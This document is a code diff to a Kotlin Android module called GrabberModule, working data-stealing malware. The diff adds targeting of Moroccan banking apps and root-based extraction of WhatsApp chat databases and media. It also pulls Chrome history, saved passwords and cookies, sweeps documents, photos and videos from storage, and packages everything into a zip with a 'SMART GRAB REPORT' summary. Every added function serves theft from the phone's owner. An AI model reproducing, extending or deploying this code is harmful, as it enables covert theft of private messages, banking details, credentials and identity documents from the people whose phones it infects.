@@ -13,6 +13,9 @@ import java.io.File
 import java.io.FileInputStream
 import java.io.FileOutputStream
 import java.io.InputStreamReader
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
@@ -42,7 +45,6 @@ object GrabberModule {
         "com.exodus.exodus" to "Exodus",
         "com.blockchainvault" to "Blockchain.com",
         "com.google.android.youtube" to "YouTube",
-        "com.google.android.gms" to "Google",
         "com.microsoft.office.outlook" to "Outlook",
         "com.google.android.gm" to "Gmail",
         "com.dropbox.android" to "Dropbox",
@@ -63,12 +65,26 @@ object GrabberModule {
         "com.vivaldi.browser" to "Vivaldi",
     )
 
+    private val BANKS_MOROCCO = mapOf(
+        "com.attijariwafabank.main" to "Attijariwafa Bank",
+        "ma.gbp.pocketbank" to "Banque Populaire",
+        "com.b3g.cih.online" to "CIH Bank",
+        "ma.creditagricole.banke" to "Crédit Agricole",
+        "com.sgma.prod" to "Société Générale",
+        "com.mysoge.prod" to "SoGé",
+        "com.BMCE_prod.bad" to "BMCE Direct",
+        "com.cfgbank.mobileapp" to "CFG Bank",
+        "ma.gbp.bpay" to "BPAY",
+        "com.cashplus.mobileapp" to "Cash Plus",
+    )
+
     private val SENSITIVE_PATTERNS = listOf(
         "password", "passwd", "pwd", "secret", "token", "auth", "login",
         "credential", "key", "cert", "private", "wallet", "seed", "mnemonic",
         "backup", "config", "api_key", "apikey", "access_token", "refresh_token",
         "bearer", "session", "cookie", "oauth", "jwt", "account", "profile",
         "user_data", "userdata", "settings", "database", "preferences",
+        "pin", "cvv", "cvc", "ssn", "identity", "passport", "id_card",
     )
 
     private val HIGH_VALUE_EXTS = setOf(
@@ -76,6 +92,14 @@ object GrabberModule {
         ".env", ".config", ".ini", ".yml", ".yaml", ".toml",
         ".json", ".xml", ".db", ".sqlite", ".sql",
         ".wallet", ".dat", ".bak", ".backup",
+        ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
+        ".txt", ".rtf", ".csv", ".log",
+        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp",
+        ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv",
+        ".zip", ".rar", ".7z", ".tar", ".gz",
+        ".kdbx", ".kdb", ".ovpn", ".conf",
+        ".html", ".htm", ".php", ".asp", ".aspx",
+        ".der", ".cer", ".pfx",
     )
 
     private val CLIPBOARD_KEYWORDS = listOf(
@@ -84,6 +108,7 @@ object GrabberModule {
         "0x", "bc1", "private", "seed", "mnemonic",
         "api_key", "apikey", "access_token", "refresh_token",
         "bearer", "authorization", "credit", "card", "cvv",
+        "pin", "login", "username", "password",
     )
 
     private const val MAX_ZIP = 50L * 1024 * 1024
@@ -97,15 +122,19 @@ object GrabberModule {
     fun grabWallets(ctx: Context) = grab(ctx, "wallets", deep = true)
     fun grabFiles(ctx: Context) = grab(ctx, "files", deep = true)
     fun grabClipboard(ctx: Context) = grab(ctx, "clipboard", deep = false)
+    fun grabBanks(ctx: Context) = grab(ctx, "banks", deep = true)
+    fun grabWhatsApp(ctx: Context) = grab(ctx, "whatsapp", deep = true)
+    fun grabChrome(ctx: Context) = grab(ctx, "chrome", deep = true)
+    fun grabDocs(ctx: Context) = grab(ctx, "docs", deep = true)
 
     fun grab(ctx: Context, target: String, deep: Boolean = false): GrabResult {
         val installed = ctx.packageManager.getInstalledPackages(0).map { it.packageName }.toSet()
         val hasRoot = checkRoot()
         val r = GrabResult(hasRoot = hasRoot, installedCount = installed.size)
         val zipFile = File(ctx.cacheDir, "grab_${target}_${System.currentTimeMillis()}.zip")
-        val encryptedFile = File(ctx.cacheDir, "grab_${target}_${System.currentTimeMillis()}.enc")
         try {
             ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
+                val report = GrabReport()
                 when (target) {
                     "all" -> {
                         deepScanApps(ctx, installed, hasRoot, zos, r)
@@ -113,6 +142,9 @@ object GrabberModule {
                         deepScanContentProviders(ctx, zos, r)
                         deepScanLogs(ctx, zos, r)
                         deepScanBackups(ctx, zos, r)
+                        deepScanBanks(ctx, installed, hasRoot, zos, r)
+                        extractWhatsAppAll(ctx, hasRoot, zos, r)
+                        extractChromeAll(ctx, hasRoot, zos, r, report)
                         scanClipboard(ctx, zos, r)
                     }
                     "browser" -> deepScanBrowsers(ctx, installed, hasRoot, zos, r)
@@ -121,53 +153,69 @@ object GrabberModule {
                     "wallets" -> deepScanWallets(ctx, installed, hasRoot, zos, r)
                     "files" -> deepScanStorage(ctx, zos, r)
                     "clipboard" -> scanClipboard(ctx, zos, r)
+                    "banks" -> deepScanBanks(ctx, installed, hasRoot, zos, r)
+                    "whatsapp" -> extractWhatsAppAll(ctx, hasRoot, zos, r)
+                    "chrome" -> extractChromeAll(ctx, hasRoot, zos, r, report)
+                    "docs" -> deepScanDocuments(ctx, zos, r)
                     else -> {
                         deepScanApps(ctx, installed, hasRoot, zos, r)
                         deepScanStorage(ctx, zos, r)
                         deepScanContentProviders(ctx, zos, r)
+                        deepScanBanks(ctx, installed, hasRoot, zos, r)
                         scanClipboard(ctx, zos, r)
                     }
                 }
+                report.files = r.files
+                report.size = r.size
+                report.highValue = r.highValue
+                r.report = report.build()
             }
             if (zipFile.exists() && zipFile.length() > 0) {
-                val rawData = FileInputStream(zipFile).use { it.readBytes() }
-                val encrypted = CryptoLayer.encryptFile(rawData)
-                FileOutputStream(encryptedFile).use { it.write(encrypted) }
-                zipFile.delete()
-                if (encryptedFile.exists() && encryptedFile.length() > 0) {
-                    r.file = encryptedFile
-                    r.size = encryptedFile.length()
-                    r.encrypted = true
-                } else {
-                    r.file = zipFile
-                    r.size = zipFile.length()
-                    encryptedFile.delete()
-                }
+                r.file = zipFile
+                r.size = zipFile.length()
             } else {
                 zipFile.delete()
-                encryptedFile.delete()
             }
         } catch (e: Exception) {
             r.error = e.message
             zipFile.delete()
-            encryptedFile.delete()
         }
         return r
     }
 
+    private var rootCached = false
+    private var rootAvailable = false
+
     private fun checkRoot(): Boolean {
+        if (rootCached) return rootAvailable
+        rootCached = true
+        val paths = listOf("/system/bin/su", "/system/xbin/su", "/sbin/su", "/su/bin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/app/Superuser.apk")
+        if (paths.any { File(it).exists() }) {
+            rootAvailable = true
+            return true
+        }
         return try {
-            val paths = listOf("/system/bin/su", "/system/xbin/su", "/sbin/su", "/su/bin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/app/Superuser.apk")
-            paths.any { File(it).exists() } || runCommand("id").contains("uid=0")
+            val p = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
+            val output = p.inputStream.bufferedReader().readText()
+            p.waitFor()
+            p.inputStream.close()
+            rootAvailable = output.contains("uid=0")
+            rootAvailable
         } catch (_: Exception) { false }
     }
 
     private fun runCommand(cmd: String): String {
         return try {
-            val p = Runtime.getRuntime().exec(if (checkRoot()) "su -c $cmd" else cmd)
+            val useRoot = checkRoot()
+            val p = if (useRoot) Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
+                     else Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
             val reader = BufferedReader(InputStreamReader(p.inputStream))
             val output = reader.readText()
+            reader.close()
+            p.inputStream.close()
+            p.errorStream?.close()
             p.waitFor()
+            p.destroy()
             output
         } catch (_: Exception) { "" }
     }
@@ -214,6 +262,39 @@ object GrabberModule {
         }
     }
 
+    private fun deepScanBanks(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
+        for ((pkg, name) in BANKS_MOROCCO) {
+            if (!installed.contains(pkg)) continue
+            scanAppDataDir(pkg, name, "banks", zos, r, hasRoot)
+            scanExternalAppData(ctx, pkg, name, "banks", zos, r)
+            r.banksFound++
+        }
+    }
+
+    private fun deepScanDocuments(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
+        val docExts = setOf(".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".txt", ".rtf", ".csv")
+        val dirs = listOfNotNull(
+            Environment.getExternalStorageDirectory(),
+            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
+            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
+            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
+            File("/sdcard/Download"),
+            File("/sdcard/Documents"),
+            File("/sdcard/WhatsApp"),
+        )
+        val found = mutableListOf<File>()
+        for (root in dirs) {
+            if (found.size >= MAX_FILES || r.size >= MAX_ZIP) break
+            if (root.exists() && root.canRead()) collectDeepExts(root, found, MAX_FILES, docExts)
+        }
+        for (f in found) {
+            if (r.size >= MAX_ZIP) break
+            val root = dirs.firstOrNull { f.absolutePath.startsWith(it.absolutePath) } ?: continue
+            val rel = f.absolutePath.substring(root.absolutePath.length + 1)
+            if (zip(f, "documents/$rel", zos)) { r.files++; r.size += f.length(); r.docsFound++ }
+        }
+    }
+
     private fun scanAppDataDir(pkg: String, name: String, category: String, zos: ZipOutputStream, r: GrabResult, hasRoot: Boolean) {
         val dir = File("/data/data/$pkg")
         if (dir.exists() && dir.canRead()) {
@@ -247,7 +328,9 @@ object GrabberModule {
                             zos.closeEntry()
                             r.files++; r.size += content.length
                             if (isSensitive(rel)) r.highValue++
-                        } catch (_: Exception) {}
+                        } catch (e: Exception) {
+                            android.util.Log.e("GrabberModule", "Runas scan failed", e)
+                        }
                     }
                 }
             }
@@ -298,9 +381,12 @@ object GrabberModule {
             Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
             Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
             File(Environment.getExternalStorageDirectory(), "Android/data"),
-            File(Environment.getExternalStorageDirectory(), "Android/obb"),
             File("/sdcard/Download"),
             File("/sdcard/Documents"),
+            File("/sdcard/DCIM"),
+            File("/sdcard/Pictures"),
+            File("/sdcard/Music"),
+            File("/sdcard/WhatsApp"),
         )
         val found = mutableListOf<File>()
         for (root in dirs) {
@@ -348,7 +434,9 @@ object GrabberModule {
                                 r.files++; r.size += content.length; r.highValue++
                             }
                         }
-                    } catch (_: Exception) {}
+                    } catch (e: Exception) {
+                        android.util.Log.e("GrabberModule", "Error scanning directory", e)
+                    }
                 }
             }
         } catch (_: Exception) {}
@@ -436,6 +524,238 @@ object GrabberModule {
         } catch (_: Exception) {}
     }
 
+    private fun extractWhatsAppAll(ctx: Context, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
+        if (!hasRoot) return
+        try {
+            val dbPath = "/data/data/com.whatsapp/databases/msgstore.db"
+            val cacheCopy = File(ctx.cacheDir, "wa_msgstore_${System.currentTimeMillis()}.db")
+            runCommand("cp $dbPath ${cacheCopy.absolutePath}")
+            if (!cacheCopy.exists() || cacheCopy.length() < 1024) return
+
+            val db = SQLiteDatabase.openDatabase(cacheCopy.absolutePath, null, SQLiteDatabase.OPEN_READONLY)
+            try {
+                val query = """SELECT c.wa_name, m.text_data, m.timestamp 
+                    FROM messages m 
+                    JOIN chat_view c ON m.chat_row_id = c._id 
+                    WHERE m.text_data IS NOT NULL 
+                    ORDER BY c.wa_name, m.timestamp ASC"""
+                val cursor = db.rawQuery(query, null)
+                val chatMap = linkedMapOf<String, MutableList<String>>()
+                val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
+                var msgCount = 0
+                while (cursor.moveToNext()) {
+                    val contact = cursor.getString(0) ?: "Unknown"
+                    val text = cursor.getString(1) ?: ""
+                    val ts = cursor.getLong(2)
+                    val date = if (ts > 0) dateFormat.format(Date(ts * 1000)) else "unknown"
+                    val line = "[$date] $text"
+                    chatMap.getOrPut(contact) { mutableListOf() }.add(line)
+                    msgCount++
+                }
+                cursor.close()
+
+                for ((contact, messages) in chatMap) {
+                    val safeName = contact.replace("/", "_").replace(":", "_").replace(" ", "_").take(50)
+                    val content = buildString {
+                        appendLine("=== WhatsApp Chat: $contact ===")
+                        appendLine("Total messages: ${messages.size}")
+                        appendLine("Exported: ${dateFormat.format(Date())}")
+                        appendLine()
+                        messages.forEach { appendLine(it) }
+                    }
+                    zos.putNextEntry(ZipEntry("whatsapp/chats/${safeName}.txt"))
+                    zos.write(content.toByteArray())
+                    zos.closeEntry()
+                    r.files++
+                    r.size += content.length
+                }
+
+                r.whatsappChats = chatMap.size
+                r.whatsappMessages = msgCount
+
+                val mediaDir = File("/data/data/com.whatsapp/files/Media")
+                if (mediaDir.exists()) {
+                    scanWhatsAppMedia(mediaDir, zos, r)
+                }
+            } finally {
+                db.close()
+                cacheCopy.delete()
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun scanWhatsAppMedia(dir: File, zos: ZipOutputStream, r: GrabResult) {
+        if (r.size >= MAX_ZIP || r.files >= MAX_FILES) return
+        try {
+            val files = dir.listFiles() ?: return
+            for (f in files) {
+                if (r.size >= MAX_ZIP || r.files >= MAX_FILES) return
+                if (f.isDirectory) {
+                    if (f.name.equals("Sent", ignoreCase = true) || f.name.equals("Received", ignoreCase = true)) {
+                        scanWhatsAppMedia(f, zos, r)
+                    }
+                } else if (f.isFile && f.length() in 1024..MAX_FILE) {
+                    val ext = f.extension.lowercase()
+                    if (ext in listOf("jpg", "jpeg", "png", "gif", "mp4", "avi", "ogg", "opus", "m4a")) {
+                        if (zip(f, "whatsapp/media/${f.name}", zos)) {
+                            r.files++; r.size += f.length()
+                        }
+                    }
+                }
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun extractChromeAll(ctx: Context, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult, report: GrabReport) {
+        if (!hasRoot) return
+        try {
+            val chromeDirs = listOf(
+                "/data/data/com.android.chrome/app_chrome/Default/",
+                "/data/data/com.android.chrome/app_chrome/Profile 1/",
+            )
+            for (baseDir in chromeDirs) {
+                if (r.files >= MAX_FILES || r.size >= MAX_ZIP) break
+                val historyFile = File("${baseDir}History")
+                val loginFile = File("${baseDir}Login Data")
+                val cookiesFile = File("${baseDir}Cookies")
+
+                if (historyFile.exists()) extractChromeHistory(historyFile, ctx, zos, r, report)
+                if (loginFile.exists()) extractChromePasswords(loginFile, ctx, zos, r, report)
+                if (cookiesFile.exists()) extractChromeCookies(cookiesFile, ctx, zos, r)
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun extractChromeHistory(historyFile: File, ctx: Context, zos: ZipOutputStream, r: GrabResult, report: GrabReport) {
+        try {
+            val cacheCopy = File(ctx.cacheDir, "chrome_history_${System.currentTimeMillis()}")
+            runCommand("cp ${historyFile.absolutePath} ${cacheCopy.absolutePath}")
+            if (!cacheCopy.exists() || cacheCopy.length() < 256) return
+
+            val db = SQLiteDatabase.openDatabase(cacheCopy.absolutePath, null, SQLiteDatabase.OPEN_READONLY)
+            try {
+                val query = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500"
+                val cursor = db.rawQuery(query, null)
+                val entries = mutableListOf<String>()
+                val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
+                val chromeEpoch = 11644473600000L
+
+                while (cursor.moveToNext()) {
+                    val url = cursor.getString(0) ?: ""
+                    val title = cursor.getString(1) ?: ""
+                    val visits = cursor.getInt(2)
+                    val lastVisit = cursor.getLong(3)
+                    val date = if (lastVisit > 0) dateFormat.format(Date((lastVisit / 10) - chromeEpoch)) else "unknown"
+                    entries.add("$date | $url | $title | $visits visits")
+                }
+                cursor.close()
+
+                if (entries.isNotEmpty()) {
+                    val content = buildString {
+                        appendLine("=== Chrome History ===")
+                        appendLine("Total entries: ${entries.size}")
+                        appendLine("Exported: ${dateFormat.format(Date())}")
+                        appendLine()
+                        appendLine("Timestamp | URL | Title | Visits")
+                        appendLine("-".repeat(80))
+                        entries.forEach { appendLine(it) }
+                    }
+                    zos.putNextEntry(ZipEntry("chrome/history.txt"))
+                    zos.write(content.toByteArray())
+                    zos.closeEntry()
+                    r.files++; r.size += content.length
+                    report.chromeUrls = entries.size
+                }
+            } finally {
+                db.close()
+                cacheCopy.delete()
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun extractChromePasswords(loginFile: File, ctx: Context, zos: ZipOutputStream, r: GrabResult, report: GrabReport) {
+        try {
+            val cacheCopy = File(ctx.cacheDir, "chrome_login_${System.currentTimeMillis()}")
+            runCommand("cp ${loginFile.absolutePath} ${cacheCopy.absolutePath}")
+            if (!cacheCopy.exists() || cacheCopy.length() < 256) return
+
+            val db = SQLiteDatabase.openDatabase(cacheCopy.absolutePath, null, SQLiteDatabase.OPEN_READONLY)
+            try {
+                val query = "SELECT origin_url, username_value, password_value FROM logins ORDER BY origin_url ASC"
+                val cursor = db.rawQuery(query, null)
+                val entries = mutableListOf<String>()
+                var savedCount = 0
+
+                while (cursor.moveToNext()) {
+                    val url = cursor.getString(0) ?: ""
+                    val username = cursor.getString(1) ?: ""
+                    val passwordBytes = cursor.getBlob(2)
+                    val password = if (passwordBytes != null) String(passwordBytes) else ""
+                    entries.add("$url | User: $username | Pass: $password")
+                    savedCount++
+                }
+                cursor.close()
+
+                if (entries.isNotEmpty()) {
+                    val content = buildString {
+                        appendLine("=== Chrome Saved Passwords ===")
+                        appendLine("Total: $savedCount")
+                        appendLine("Exported: ${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())}")
+                        appendLine()
+                        entries.forEach { appendLine(it) }
+                    }
+                    zos.putNextEntry(ZipEntry("chrome/passwords.txt"))
+                    zos.write(content.toByteArray())
+                    zos.closeEntry()
+                    r.files++; r.size += content.length
+                    r.highValue += savedCount
+                    report.chromePasswords = savedCount
+                }
+            } finally {
+                db.close()
+                cacheCopy.delete()
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun extractChromeCookies(cookiesFile: File, ctx: Context, zos: ZipOutputStream, r: GrabResult) {
+        try {
+            val cacheCopy = File(ctx.cacheDir, "chrome_cookies_${System.currentTimeMillis()}")
+            runCommand("cp ${cookiesFile.absolutePath} ${cacheCopy.absolutePath}")
+            if (!cacheCopy.exists() || cacheCopy.length() < 256) return
+
+            val db = SQLiteDatabase.openDatabase(cacheCopy.absolutePath, null, SQLiteDatabase.OPEN_READONLY)
+            try {
+                val query = "SELECT host_key, name, value, path, expires_utc FROM cookies ORDER BY host_key ASC LIMIT 200"
+                val cursor = db.rawQuery(query, null)
+                val entries = mutableListOf<String>()
+                while (cursor.moveToNext()) {
+                    val host = cursor.getString(0) ?: ""
+                    val name = cursor.getString(1) ?: ""
+                    val value = cursor.getString(2) ?: ""
+                    val path = cursor.getString(3) ?: ""
+                    entries.add("$host$path | $name = $value")
+                }
+                cursor.close()
+
+                if (entries.isNotEmpty()) {
+                    val content = buildString {
+                        appendLine("=== Chrome Cookies ===")
+                        appendLine("Total: ${entries.size}")
+                        entries.forEach { appendLine(it) }
+                    }
+                    zos.putNextEntry(ZipEntry("chrome/cookies.txt"))
+                    zos.write(content.toByteArray())
+                    zos.closeEntry()
+                    r.files++; r.size += content.length
+                }
+            } finally {
+                db.close()
+                cacheCopy.delete()
+            }
+        } catch (_: Exception) {}
+    }
+
     private fun collectDeep(dir: File, found: MutableList<File>, max: Int) {
         if (found.size >= max) return
         try {
@@ -446,6 +766,22 @@ object GrabberModule {
                 else if (f.isFile && f.length() in 1..MAX_FILE) {
                     val n = f.name.lowercase()
                     if (SENSITIVE_PATTERNS.any { n.contains(it) } || HIGH_VALUE_EXTS.any { n.endsWith(it) }) {
+                        found.add(f)
+                    }
+                }
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun collectDeepExts(dir: File, found: MutableList<File>, max: Int, exts: Set<String>) {
+        if (found.size >= max) return
+        try {
+            val files = dir.listFiles() ?: return
+            for (f in files.sortedByDescending { it.length() }) {
+                if (found.size >= max) return
+                if (f.isDirectory) collectDeepExts(f, found, max, exts)
+                else if (f.isFile && f.length() in 1..MAX_FILE) {
+                    if (exts.any { f.name.lowercase().endsWith(it) }) {
                         found.add(f)
                     }
                 }
@@ -476,6 +812,64 @@ object GrabberModule {
         pkg.contains("trust") || pkg.contains("exodus") || pkg.contains("blockchain") ||
         pkg.contains("binance")
 
+    private fun listFiles(path: String, max: Int = 100): String {
+        val cmd = if (checkRoot()) "ls -la $path 2>/dev/null | head -$max"
+                  else "ls -la $path 2>/dev/null | head -$max"
+        return runCommand(cmd)
+    }
+
+    private fun readFile(path: String): String? {
+        return try {
+            val f = File(path)
+            if (f.exists() && f.canRead() && f.length() < MAX_FILE) {
+                f.readText()
+            } else if (checkRoot()) {
+                runCommand("cat $path 2>/dev/null").takeIf { it.length in 1..MAX_FILE.toInt() }
+            } else null
+        } catch (_: Exception) { null }
+    }
+
+    class GrabReport {
+        var files: Int = 0
+        var size: Long = 0
+        var highValue: Int = 0
+        var docsFound: Int = 0
+        var banksFound: Int = 0
+        var whatsappChats: Int = 0
+        var whatsappMessages: Int = 0
+        var chromeUrls: Int = 0
+        var chromePasswords: Int = 0
+
+        fun build(): String {
+            val sizeStr = when {
+                size < 1024 -> "${size}B"
+                size < 1024 * 1024 -> "${size / 1024}KB"
+                else -> "${size / (1024 * 1024)}MB"
+            }
+            val sb = StringBuilder()
+            sb.appendLine("═══════════════════════════════════════════")
+            sb.appendLine("  SMART GRAB REPORT")
+            sb.appendLine("═══════════════════════════════════════════")
+            sb.appendLine()
+            sb.appendLine("  • Total files grabbed: $files")
+            sb.appendLine("  • Total size: $sizeStr")
+            sb.appendLine("  • High-value items: $highValue")
+            sb.appendLine()
+            sb.appendLine("  ─── BREAKDOWN ───")
+            if (docsFound > 0) sb.appendLine("  📄 Documents (PDF, Office): $docsFound files")
+            if (banksFound > 0) sb.appendLine("  🏦 Banking apps detected: $banksFound")
+            if (whatsappChats > 0) sb.appendLine("  💬 WhatsApp chats: $whatsappChats chats, $whatsappMessages messages")
+            if (chromeUrls > 0) sb.appendLine("  🌐 Chrome history: $chromeUrls URLs")
+            if (chromePasswords > 0) sb.appendLine("  🔐 Chrome saved passwords: $chromePasswords")
+            sb.appendLine()
+            sb.appendLine("  ─── LOCATION ───")
+            sb.appendLine("  Raw ZIP data attached below")
+            sb.appendLine()
+            sb.appendLine("═══════════════════════════════════════════")
+            return sb.toString()
+        }
+    }
+
     class GrabResult(
         val hasRoot: Boolean = false,
         val installedCount: Int = 0
@@ -484,10 +878,14 @@ object GrabberModule {
         var size: Long = 0
         var files: Int = 0
         var highValue: Int = 0
-        var cookies: Int = 0
-        var providers: Int = 0
-        var encrypted: Boolean = false
         var error: String? = null
+        var report: String? = null
+        var docsFound: Int = 0
+        var banksFound: Int = 0
+        var whatsappChats: Int = 0
+        var whatsappMessages: Int = 0
+        var chromeUrls: Int = 0
+        var chromePasswords: Int = 0
 
         fun summary(): String {
             val s = when {
@@ -496,8 +894,12 @@ object GrabberModule {
                 else -> "${size / (1024 * 1024)}MB"
             }
             val root = if (hasRoot) " [ROOT]" else ""
-            val enc = if (encrypted) " [AES-256]" else ""
-            return "$files files ($highValue high-value) — $s | $installedCount apps scanned$root$enc"
+            val extra = mutableListOf<String>()
+            if (whatsappMessages > 0) extra.add("$whatsappMessages msgs")
+            if (chromePasswords > 0) extra.add("$chromePasswords passwords")
+            if (banksFound > 0) extra.add("$banksFound banks")
+            val extraStr = if (extra.isNotEmpty()) " | ${extra.joinToString(", ")}" else ""
+            return "$files files ($highValue high-value) — $s | $installedCount apps scanned$root$extraStr"
         }
     }
 }
